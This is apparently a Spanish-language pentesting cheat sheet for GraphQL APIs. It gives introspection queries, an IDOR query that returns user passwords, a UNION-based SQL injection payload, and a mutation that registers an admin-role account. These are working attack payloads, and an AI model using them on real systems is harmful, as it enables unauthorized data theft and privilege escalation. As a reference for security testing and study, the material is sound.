# Information Disclosure
[Estructura](https://apis.guru/graphql-voyager/)

Conocer la estructura de la query
```
{
  __schema {
    types {
      name
    }
  }
}
```

Conocer la estructura de un objeto en especifico
```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
Listar todas las querys raiz
```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```
Informacion general
```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

# IDOR
- Cambiar el valor del atributo
Por ejemplo sabien el nombre de un usuario y el atributo del objeto
```
{
  user(username: "test") {
    username
    password
  }
}
```

# Injection Attacks
## SQLi
```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```
## XSS
<img width="1538" height="632" alt="image" src="https://github.com/user-attachments/assets/6785f979-22a7-4370-97c9-c09261da129e" />

# Mutations
Identificar mutaciones para actualizar, obtener informacion de otras cuentas o crear cuentas con roles mas altos
```
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```
